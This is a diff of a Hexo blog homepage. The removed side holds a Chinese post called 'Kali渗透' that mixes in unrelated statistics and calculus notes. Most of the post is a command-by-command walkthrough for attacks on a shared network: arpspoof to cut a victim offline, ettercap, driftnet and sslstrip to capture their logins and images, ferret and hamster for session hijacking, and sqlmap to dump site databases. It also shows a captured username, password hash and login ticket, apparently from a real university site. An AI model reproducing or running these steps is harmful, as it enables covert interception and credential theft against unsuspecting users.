@@ -1,739 +1,812 @@
 <!DOCTYPE html>
-<html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
 <head><meta name="generator" content="Hexo 3.8.0">
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-    <meta name="author" content="John Doe">
-    
-    
-    
-    
-    
-    
-    <title>Hexo</title>
-    <!-- inject:style -->
-    <link href="/css/style.css" rel="stylesheet" type="text/css">
-    <!-- endinject -->
-    <style>
-        .cube-loading {
-            top: 0;
-            position: fixed;
-            width: 100%;
-            height: 100%;
-            background: url('/images/lg/loading.gif') no-repeat center center;
-            background-color: rgba(0,0,0,.7);
-        }
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
 
-        .cube-loading.out {
-            display: none;
-        }
 
-        .cube-loading:before {
-            display: block;
-            content: 'Loading';
-            position: relative;
-            width: 100%;
-            top: 50%;
-            right: -50%;
-            color: #fff;
-        }
 
-        @media(max-width: 768px) {
-            .cube-loading:before {
-                font-size: 1.2em;
-                transform: translate(-24px,20px);
-                -webkit-transform: translate(-24px,20px);
-                -o-transform: translate(-24px,20px);
-                -ms-transform: translate(-24px,20px);
-            }
-        }
 
-        @media(min-width: 768px) {
-            .cube-loading:before {
 
-            }
-        }
-    </style>
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+  <script>
+  (function(i,s,o,g,r,a,m){i["DaoVoiceObject"]=r;i[r]=i[r]||function(){(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;a.charset="utf-8";m.parentNode.insertBefore(a,m)})(window,document,"script",('https:' == document.location.protocol ? 'https:' : 'http:') + "//widget.daovoice.io/widget/0f81ff2f.js","daovoice")
+  daovoice('init', {
+      app_id: "86c69b95"
+    });
+  daovoice('update');
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT">
+
+
+
+
+
+
+
+
+
+
+<meta property="og:type" content="website">
+<meta property="og:title" content="Hexo">
+<meta property="og:url" content="http://yoursite.com/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:locale" content="zh-Hans">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Hexo">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"always","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/">
+
+
+
+
+
+  <title>Hexo</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
     
-</head></html>
-<body>
-<div class="cube-body">
-    <nav id="cube-top-memu" class="cube-menu">
-    <ul class="cube-menu-collapse">
-        
-        <li>
-            <i class="cube-icon cube-icon-home" aria-hidden="true"></i>
-            <a href="/">首页</a>
-        </li>
-        
-        <li>
-            <i class="cube-icon cube-icon-archive" aria-hidden="true"></i>
-            <a href="/archives">归档</a>
-        </li>
-        
-        <li>
-            <i class="cube-icon cube-icon-categories" aria-hidden="true"></i>
-            <a href="/categories">分类</a>
-        </li>
-        
-        <li>
-            <i class="cube-icon cube-icon-tags" aria-hidden="true"></i>
-            <a href="/tags">标签</a>
-        </li>
-        
-        <li>
-            <i class="cube-icon cube-icon-about" aria-hidden="true"></i>
-            <a href="/about-me">关于我</a>
-        </li>
-        
-    </ul>
-</nav>
-<nav class="cube-side-menu" id="cube-side-menu">
-    <ul class="cube-menu-list">
-        
-        <li>
-            <a class="lrc-control">Open Lyrics</a>
-        </li>
-        
-        <li>
-            <a class="scroll-to-top">Top</a>
-        </li>
-    </ul>
-</nav>
-    <header class="cube-header" id="cube-header">
-    <img src=" http://p17.qhimg.com/bdr/__85/t011a0f309d607414ca.jpg " alt="头部背景图片">
+  
+
+  <div class="container sidebar-position-left 
+  page-home">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
     
-    <div class="cube-type">
-        <span class="cube-typed-title">senrenbankaの部落格</span>
-        <span class="cube-typed-cursor">|</span>
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Hexo</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
     </div>
-    
-</header>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
 
-    <style>
-        nav.cube-menu:before {
-            content: '';
-            visibility: hidden;
-            position: absolute;
-            left: 0;
-            top: 0;
-            width: 100%;
-            height: 44px;
-        
-            filter: blur(5px);
-            -webkit-filter: blur(5px);
-        
-            z-index: -1;
-            background-image: url('http://p17.qhimg.com/bdr/__85/t011a0f309d607414ca.jpg');
-            background-repeat: no-repeat;
-            background-position: center -356px;
-            background-size: cover;
-            background-color: transparent;
-        }
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
 
-        header.cube-background.cube-header-background {
-            visibility: hidden;
-            background-image: url('http://p17.qhimg.com/bdr/__85/t011a0f309d607414ca.jpg');
-            background-position: center -400px;
-        }
-    </style>
-    <header class="cube-background cube-header-background">
-        
-        <div class="cube-type">
-            <span class="cube-typed-title">senrenbankaの部落格</span>
-            <span class="cube-typed-cursor">|</span>
-        </div>
-        
-    </header>
-    <div class="load-header-background"></div>
-    <script>
-        (function (window) {
+<nav class="site-nav">
+  
 
-            window.headerModule = {}
-            window.headerModule.image = {
-                width: '2000',
-                height: '1414'
-            }
-
-        })(window)
-    </script>
-    
-    <div class="cube-content">
-        <div class="cube-left">
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
             
-<div class="cube-excerpt" id="cube-excerpt-Kali">
-    <header class="cube-excerpt-header">
-        <h1><a href="/2018/11/23/Kali/">Kali</a></h1>
-        <div class="cube-excerpt-header-msg">
-            <div class="cube-excerpt-date">
-                <i class="cube-icon cube-icon-date" aria-hidden="true"></i>
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-schedule">
+          <a href="/schedule/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-calendar"></i> <br>
+            
+            日程表
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+  <section id="posts" class="posts-expand">
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/11/23/Kali/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="txj">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/11/23/Kali/" itemprop="url">Kali</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-11-23T13:54:02+08:00">
                 2018-11-23
-            </div>
-            <div class="cube-excerpt-tags">
-                <i class="cube-icon cube-icon-tag" aria-hidden="true"></i>
-                
-            </div>
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
         </div>
-    </header>
-    <article class="cube-excerpt-entry cube-markdown">
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
         
+          
+          总共是三台电脑A、B、CB可以pingAC，AC不能pingB，AC可以互ping
+3.①：模型变换法对存在异方差性的模型进行适当的变量交换，使之成为满足同方差假定的模型，其前提是合理确定异方差性的具体形式。②：加权最小二乘法（WLS）对原模型进行加权，使之成为一个新的不存在异方差性的模型，然后采用最小二乘法估计其参数③：模型的对数变换对数变换使所测量的变量尺度缩小，进而缩小原变量差异的倍数，对数变换后的模型的残差$e_i$表示相对误差，其比绝对误差有较小的差异，进而降低异方差的影响。
+
+第一个他将区间分为0-$\frac{1}{2}$和$\frac{1}{2}$其实只是为了让解答过程更加清晰
+          ...
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2018/11/23/Kali/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
-           <p>总共是三台电脑A、B、C<br>B可以pingAC，AC不能pingB，AC可以互ping</p>
-<p>3.<br>①：模型变换法<br>对存在异方差性的模型进行适当的变量交换，使之成为满足同方差假定的模型，其前提是合理确定异方差性的具体形式。<br>②：加权最小二乘法（WLS）<br>对原模型进行加权，使之成为一个新的不存在异方差性的模型，然后采用最小二乘法估计其参数<br>③：模型的对数变换<br>对数变换使所测量的变量尺度缩小，进而缩小原变量差异的倍数，对数变换后的模型的残差<br>$e_i$表示相对误差，其比绝对误差有较小的差异，进而降低异方差的影响。</p>
-<ul>
-<li>第一个他将区间分为0-$\frac{1}{2}$和$\frac{1}{2}$其实只是为了让解答过程更加清晰一些而已，没有实际的意义。你完全可以也可以从$\frac{1}{3}、\frac{1}{4}$分开。</li>
-<li>第二个同敛散问题你要观察，$\int_\frac{1}{2}^1\frac{\sqrt[m]{ln^2(1-x)}}{\sqrt[n]{x}}dx$、$\int_{\frac{1}{2}}^1{\sqrt[m]{ln^2(1-x)}}dx$，第二个积分中的被积函数的分母在这个区间内是一个有界的形式，而分子中的$ln(1-x)$在$x=1$的时候是无界的，所以只考虑分子就行了，他们同敛散。</li>
-<li>后面的小于的话你构造一个新的函数然后求导就行了。</li>
-</ul>
-<iframe width="560" height="315" src="https://www.youtube.com/embed/Ilg3gGewQ5U" frameborder="0" allowfullscreen></iframe>
+      
+    </div>
+    
+    
+    
 
+    
 
+    
 
+    
 
+    <footer class="post-footer">
+      
 
-<h1 id="Kali渗透"><a href="#Kali渗透" class="headerlink" title="Kali渗透"></a><center>Kali渗透</center></h1><h2 id="一、换源并安装open-vm-tools"><a href="#一、换源并安装open-vm-tools" class="headerlink" title="一、换源并安装open-vm-tools"></a>一、换源并安装open-vm-tools</h2><h3 id="1-1-打开sources-list文件"><a href="#1-1-打开sources-list文件" class="headerlink" title="1.1 打开sources.list文件"></a>1.1 打开sources.list文件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">leafpad /etc/apt/sources.list</span><br></pre></td></tr></table></figure>
-<h3 id="1-2-在文件中添加如下内容"><a href="#1-2-在文件中添加如下内容" class="headerlink" title="1.2 在文件中添加如下内容"></a>1.2 在文件中添加如下内容</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">deb http://mirrors.edu.cn/kali sana main non-free contrib</span><br><span class="line">deb http://mirrors.edu.cn/kali-security/sana/updates main contrib non-free</span><br><span class="line">deb-src http://mirrors.ustc.edu.cn/kali-security/sana/updates main contrib non-free</span><br><span class="line">deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free</span><br></pre></td></tr></table></figure>
-<h3 id="1-3-更新并安装"><a href="#1-3-更新并安装" class="headerlink" title="1.3 更新并安装"></a>1.3 更新并安装</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt-get update</span><br><span class="line">apt-get install open-vm-tools-desktop fuse</span><br></pre></td></tr></table></figure>
-<h2 id="二、安装中文输入"><a href="#二、安装中文输入" class="headerlink" title="二、安装中文输入"></a>二、安装中文输入</h2><h3 id="2-1-下载搜狗"><a href="#2-1-下载搜狗" class="headerlink" title="2.1 下载搜狗"></a>2.1 下载搜狗</h3><p>在pinyin.sogou.com/linux中下载搜狗</p>
-<h3 id="2-2-安装"><a href="#2-2-安装" class="headerlink" title="2.2 安装"></a>2.2 安装</h3><p>终端进入上方文件路径，执行如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">解决依赖：apt-get install -f</span><br><span class="line">安装：dpkg -i 包名</span><br></pre></td></tr></table></figure></p>
-<h2 id="三、美化kali"><a href="#三、美化kali" class="headerlink" title="三、美化kali"></a>三、美化kali</h2><p>图标位置：/usr/share/icons/<br>主题位置：/usr/share/themes/</p>
-<h3 id="四、局域网断网攻击"><a href="#四、局域网断网攻击" class="headerlink" title="四、局域网断网攻击"></a>四、局域网断网攻击</h3><h3 id="4-1-欺骗"><a href="#4-1-欺骗" class="headerlink" title="4.1 欺骗"></a>4.1 欺骗</h3><p>欺骗命令如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arpspoof -i 网卡 -t 被骗目标ip 网关</span><br></pre></td></tr></table></figure></p>
-<p>欺骗命令执行之前需要桥接自己的kali网络，其桥接过程如下：</p>
-<ol>
-<li>右键kali系统，点开设置</li>
-<li>将网络适配器设置成桥接模式</li>
-<li>一次点开：编辑 -&gt; 虚拟网络编辑器 -&gt; vmnet0 -&gt; 确定</li>
-</ol>
-<p>参数解读：</p>
-<ol>
-<li>网卡：网卡是kali的网卡名，可以使用ifconfig查看（可见eth0）</li>
-<li>被骗目标ip：受害者的ip，windows用户可以使用ipconfig查看</li>
-<li>网关：网关是一个中间载体，同样可以使用ipconfig查看（默认网关）</li>
-</ol>
-<p>ip查询：我们在对受害者进行arp欺骗的时候，往往是不知道对方的ip的，但是我么可以使用如下命令偷偷的查询对方ip：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fping -asg 192.168.31.0/24 //网关最后是0+24</span><br></pre></td></tr></table></figure></p>
-<h3 id="4-2-攻击"><a href="#4-2-攻击" class="headerlink" title="4.2 攻击"></a>4.2 攻击</h3><h4 id="4-2-1-瘫痪对方的电脑"><a href="#4-2-1-瘫痪对方的电脑" class="headerlink" title="4.2.1 瘫痪对方的电脑"></a>4.2.1 瘫痪对方的电脑</h4><p>执行上述命令，即可让对方的网络瘫痪：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arpspoof -i 网卡 -t 被骗目标ip 网关</span><br></pre></td></tr></table></figure>
-<p>执行之后，对方就无法正常使用网络了（比如访问网页、qq聊天等等一切网络活动），ctrl+z之后取消瘫痪操作</p>
-<h4 id="4-2-2-劫持对方的请求（账号，密码之类的）"><a href="#4-2-2-劫持对方的请求（账号，密码之类的）" class="headerlink" title="4.2.2 劫持对方的请求（账号，密码之类的）"></a>4.2.2 劫持对方的请求（账号，密码之类的）</h4><p>这里的劫持与上后面的瘫痪有点不同，劫持的话不能让对方网络瘫痪，所以我们在劫持之前需要进行如下命令操作（ip流量转发）：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /proc/sys/net/ipv4/  # 进入该目录</span><br><span class="line">cat ip_forward  # 查看属性值，会发现输出0（默认是0，我们需要更改为1）</span><br><span class="line">echo 1 &gt; ip_forward```# 将ip_forward值改为1</span><br></pre></td></tr></table></figure></p>
-<p>如上操作之后我们继续执行arpspoof欺骗：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arpspoof -i 网卡 -t 被骗目标ip 网关</span><br></pre></td></tr></table></figure></p>
-<p>在欺骗之后，我们执行如下命令来进行嗅探：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ettercap -Tq -i eth0</span><br></pre></td></tr></table></figure></p>
-<p>执行之后发现，虽然这次对方可以正常使用网络，但是他的电脑已经在我们的监控中了，比如目标登录自己的某个站点，则在kali的终端上会输出对方的账号及密码</p>
-<h4 id="4-2-4-嗅探对方的浏览图片"><a href="#4-2-4-嗅探对方的浏览图片" class="headerlink" title="4.2.4 嗅探对方的浏览图片"></a>4.2.4 嗅探对方的浏览图片</h4><p>在进行上述的ip流量转发之后，我们可以使用如下命令来截取对方浏览页面的图片：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">driftnet -i eth0</span><br></pre></td></tr></table></figure></p>
-<p>执行之后，会出现一个窗口    ，该窗口用于显示对方浏览页面的图片，并会将图片保存至kali本地</p>
-<h2 id="五、https账号、密码获取"><a href="#五、https账号、密码获取" class="headerlink" title="五、https账号、密码获取"></a>五、https账号、密码获取</h2><h3 id="5-1-准备工作"><a href="#5-1-准备工作" class="headerlink" title="5.1 准备工作"></a>5.1 准备工作</h3><h4 id="5-1-1-Vim：文本编辑器"><a href="#5-1-1-Vim：文本编辑器" class="headerlink" title="5.1.1 Vim：文本编辑器"></a>5.1.1 Vim：文本编辑器</h4><p>进入文件进行编辑：vim 123.txt （不存在会自动创建）<br>退出文件编辑：</p>
-<ol>
-<li>按ESC </li>
-<li>shift+： </li>
-<li><ol start="3">
-<li>输入q！   # 不保存退出</li>
-</ol>
-</li>
-</ol>
-<p>打开 etterc.conf文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/ettercap/ettc.conf/</span><br></pre></td></tr></table></figure></p>
-<p>移动光标，把linux设置一下，将redir前的注释符删掉<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># if you use iptables:</span><br><span class="line">   #redir_command_on = &quot;iptables -t nat -A PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport&quot;</span><br><span class="line">   #redir_command_off = &quot;iptables -t nat -D PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport&quot;</span><br></pre></td></tr></table></figure></p>
-<p>刚开始是不能编辑的，编辑操作如下</p>
-<ul>
-<li><p>vim编辑：按一下 i 就可以对文件进行编辑了，在上述所述的位置将两个#去掉</p>
-</li>
-<li><p>vim保存：按一下ESC键，再按shift+:键，继续如下：</p>
-</li>
-</ul>
-<ol>
-<li>wq   保存并退出</li>
-<li>q!   不保存并退出</li>
-</ol>
-<h4 id="5-1-2-开启ssh："><a href="#5-1-2-开启ssh：" class="headerlink" title="5.1.2 开启ssh："></a>5.1.2 开启ssh：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/etc/initd/ssh start</span><br></pre></td></tr></table></figure>
-<h4 id="5-1-3-sslstrip工具"><a href="#5-1-3-sslstrip工具" class="headerlink" title="5.1.3 sslstrip工具"></a>5.1.3 sslstrip工具</h4><p>这个工具能够把https的链接还原为http。<br>执行命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sslstrip -a -f -k</span><br></pre></td></tr></table></figure></p>
-<p>参数说明：</p>
-<ol>
-<li>-a</li>
-<li>-f</li>
-<li>-k</li>
-</ol>
-<h3 id="5-2-截取账号及密码"><a href="#5-2-截取账号及密码" class="headerlink" title="5.2 截取账号及密码"></a>5.2 截取账号及密码</h3><ul>
-<li><p>执行欺骗操作</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arpspoof -i eth0 -t 192.168.31.117 192.168.31.1</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>执行sslstrip</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sslstrip -a -f -k</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>执行ettercap</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ettercap -Tq -i eth0</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>当目标用户登录https登录的时候就可以在kali终端获取到他的账号以及密码，例子如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">HTTP : 211.80.112.41:80 -&gt; </span><br><span class="line">USER: 1620814  </span><br><span class="line">PASS: 741948a7645fa6f8da44f69bd12e70443cc9d45b9714a26af17c84abe4e4d75a  </span><br><span class="line">INFO: mids.gench.edu.cn/_customize/passLogin</span><br><span class="line">CONTENT: loginTicket=425d9c18-424b-418d-b027-2095e618f829&amp;username=1620814&amp;password=741948a7645fa6f8da44f69bd12e70443cc9d45b9714a26af17c84abe4e4d75a</span><br></pre></td></tr></table></figure>
-</li>
-</ul>
-<p>分析：</p>
-<ol>
-<li>HTTP：ip及端口</li>
-<li>USER：用户名</li>
-<li>PASS：登录密码，注意：这里的密码并不是明文的，他是经过加密的，至于如何解密这个密码，以后有时间再来介绍</li>
-<li>CONTENT：参数的组合</li>
-</ol>
-<h2 id="六、回话劫持，登录目标站点"><a href="#六、回话劫持，登录目标站点" class="headerlink" title="六、回话劫持，登录目标站点"></a>六、回话劫持，登录目标站点</h2><h3 id="6-1-工具准备"><a href="#6-1-工具准备" class="headerlink" title="6.1 工具准备"></a>6.1 工具准备</h3><ol>
-<li>arpspoof     欺骗</li>
-<li>wireshark        抓包</li>
-<li>ferret       重新生成抓包后的文件</li>
-<li>hamster</li>
-</ol>
-<p>ferret安装，一次执行如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dpkg --add-architecture i386 &amp;&amp; apt-get update &amp;&amp; apt-get install ferret-sidejack:i386</span><br><span class="line">apt-get clean &amp;&amp; apt-get update &amp;&amp; apt-get upgrade -y &amp;&amp; apt-get dist-upgrade -y</span><br><span class="line">apt install ferret -y</span><br></pre></td></tr></table></figure></p>
-<h3 id="6-2-过程（方法一）"><a href="#6-2-过程（方法一）" class="headerlink" title="6.2 过程（方法一）"></a>6.2 过程（方法一）</h3><ul>
-<li>arpspoof欺骗</li>
-<li><p>启动wireshark</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wireshark</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>点击eth0网卡，并让他持续运行下去</p>
-</li>
-<li>目标登录某个站点（上钩）</li>
-<li>为了防止延迟，让wireshark再运行一段时间之后停掉wireshark</li>
-<li>保存文件名为cookie至桌面，并格式为wireshark…….pacp</li>
-<li><p>终端进入桌面，并执行如下命令（这个ferret有点问题，在这记录一下，以后再来看）：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ferret -r cookie.pcap</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>执行hamster，会看到要求我们把代理改成本地（127.0.0.1）的，然后端口为1234</p>
-</li>
-</ul>
-<ol>
-<li>代开kali内置的火狐浏览器</li>
-<li>点击设置 -&gt; Advanced -&gt; Network -&gt; Settings -&gt; 勾选Manual……并将http proxy改为127.0.0.1：1234</li>
-</ol>
-<ul>
-<li>在kali中访问127.0.0.1：1234</li>
-<li>之后会发现有个欺骗的ip，点开后就会出现很多的链接，ctrl+f找到</li>
-</ul>
-<h3 id="6-3-过程（方法二）"><a href="#6-3-过程（方法二）" class="headerlink" title="6.3 过程（方法二）"></a>6.3 过程（方法二）</h3><ul>
-<li>ferret -i eth0</li>
-<li>以后在记录</li>
-</ul>
-<h2 id="七、SQLMAP注入，ASP、PHP网站渗透"><a href="#七、SQLMAP注入，ASP、PHP网站渗透" class="headerlink" title="七、SQLMAP注入，ASP、PHP网站渗透"></a>七、SQLMAP注入，ASP、PHP网站渗透</h2><h3 id="7-1-科普"><a href="#7-1-科普" class="headerlink" title="7.1 科普"></a>7.1 科普</h3><h4 id="7-1-1-ASP"><a href="#7-1-1-ASP" class="headerlink" title="7.1.1 ASP"></a>7.1.1 ASP</h4><p>ASP即Active Server Pages，是MicroSoft公司开发的服务器端脚本环境，可用来创建动态交互式网页并建立强大的web应用程序。当服务器收到对ASP文件的请求时，它会处理包含在用于构建发送给浏览器的HTML（Hyper Text Markup Language，超文本置标语言）网页文件中的服务器端脚本代码。除服务器端脚本代码外，ASP文件也可以包含文本、HTML（包括相关的客户端脚本）和com组件调用。 [1-2]<br>ASP简单、易于维护 ， 是小型页面应用程序的选择 ，在使用DCOM （Distributed Component Object Model）和 MTS（Microsoft Transaction Server）的情况下， ASP甚至可以实现中等规模的企业应用程序。 [3] </p>
-<h4 id="7-1-2-PHP"><a href="#7-1-2-PHP" class="headerlink" title="7.1.2 PHP"></a>7.1.2 PHP</h4><p>PHP（外文名:PHP: Hypertext Preprocessor，中文名：“超文本预处理器”）是一种通用开源脚本语言。语法吸收了C语言、Java和Perl的特点，利于学习，使用广泛，主要适用于Web开发领域。PHP 独特的语法混合了C、Java、Perl以及PHP自创的语法。它可以比CGI或者Perl更快速地执行动态网页。用PHP做出的动态页面与其他的编程语言相比，PHP是将程序嵌入到HTML（标准通用标记语言下的一个应用）文档中去执行，执行效率比完全生成HTML标记的CGI要高许多；PHP还可以执行编译后代码，编译可以达到加密和优化代码运行，使代码运行更快。</p>
-<h3 id="7-2-ASP渗透"><a href="#7-2-ASP渗透" class="headerlink" title="7.2 ASP渗透"></a>7.2 ASP渗透</h3><ul>
-<li>监测是否存在注入<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u 网站</span><br></pre></td></tr></table></figure>
-</li>
-</ul>
-<p>如果该目标网站有注入，则会返回数据库的各种信息。</p>
-<ul>
-<li><p>拆解目标网站的数据库表</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u 网站 --tables</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>根据User表拆解列名</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlamp -u 网站 --columns -T &quot;user&quot;</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>username拆解出来后就不需要再进行拆解了</p>
-</li>
